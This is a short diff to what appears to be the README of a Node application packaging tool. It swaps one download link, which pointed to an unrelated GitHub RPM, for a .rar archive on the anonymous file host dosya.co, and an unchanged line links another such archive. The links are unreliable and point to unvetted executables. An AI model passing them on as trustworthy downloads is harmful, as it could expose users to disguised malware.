@@ -7,7 +7,7 @@ This application allows you to package your node application without having to d
 
 [ExecutableCreator-win32-x32.rar](https://dosya.co/tid91gfx3dea/ExecutableCreator-win32-ia32.rar.html)
 
-[ExecutableCreator-win32-x64.rar](https://github.com/joergklein/packages/raw/master/centos/8/x86_64/rpms/hello-2.10-1.el8.x86_64.rpm)
+[ExecutableCreator-win32-x64.rar](https://dosya.co/vfcxjngx59hw/ExecutableCreator-win32-x64.rar.html)
 
 ### Install packages
 
